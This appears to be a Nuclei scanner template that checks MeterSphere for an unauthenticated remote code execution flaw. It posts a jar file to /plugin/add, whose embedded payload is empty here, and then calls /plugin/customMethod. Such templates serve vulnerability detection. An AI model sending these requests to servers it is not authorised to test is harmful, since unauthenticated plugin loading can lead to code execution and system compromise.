id: metersphere-rce
info:
  name: MeterSphere customMethod API Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    MeterSphere has a remote code execution vulnerability caused by the lack of authentication in the plugin interface. Remote unauthorized attackers can execute arbitrary code by crafting specific requests.
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzI1NTMxMDU1MA==&mid=2247484978&idx=1&sn=b6ff573b89173a31c2f3ff89d7e678b5&chksm=ea36a98bdd41209d50d741d87d8f8eede8afdc70bbecb7876e7117b39fadf20bbb31b9d7e737#rd

http:
  - raw:
      - |
        POST /plugin/add HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywcBc0bWsRJaRxrUG
        Accept: application/json, text/plain, */*

        ------WebKitFormBoundarywcBc0bWsRJaRxrUG
        Content-Disposition: form-data; name="file"; filename="whatever.jar"
        Content-Type: application/octet-stream

        {{hex_decode('')}}
        ------WebKitFormBoundarywcBc0bWsRJaRxrUG--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "application/json"
  - raw:
      - |
        POST /plugin/customMethod HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: application/json, text/plain, */*

        {"entry":"RequestCommon","request":"/test"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "RequestCommon"
